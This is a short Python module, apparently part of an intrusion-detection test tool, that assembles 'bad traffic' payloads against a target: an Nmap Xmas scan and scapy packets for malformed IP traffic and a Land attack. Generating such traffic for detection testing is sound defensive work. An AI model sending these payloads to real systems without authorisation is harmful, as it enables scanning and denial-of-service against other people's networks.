#!/usr/bin/env python

import ConfigParser

class BadTraffic():
    def __init__(self, target):
        # Read configuration
        self.config = ConfigParser.RawConfigParser()
        self.config.read('config.cfg')

        self._target = target
        self.payloads = []

    def getPayloads(self):

        ### Nmap Xmas Scan
        self.payloads.append([
            "Nmap Xmas scan",
            "command",
            [self.config.get('PATHS', 'sudo'), self.config.get('PATHS', 'nmap'), '-sX', '-p 80', self._target],
            ""
            ])

        ### Malformed Traffic
        self.payloads.append([
            "Malformed Traffic",
            "scapy",
            """send(IP(dst="%s", ihl=2, version=3)/ICMP())""" % self._target,
            ""
            ])

        ### Land Attack
        self.payloads.append([
            "Land Attack",
            "scapy",
            """send(IP(src="%s",dst="%s")/TCP(sport=135,dport=135))""" % (self._target, self._target),
            ""
            ])

        return self.payloads

if __name__ == "__main__":
    print BadTraffic("192.168.100.48").getPayloads()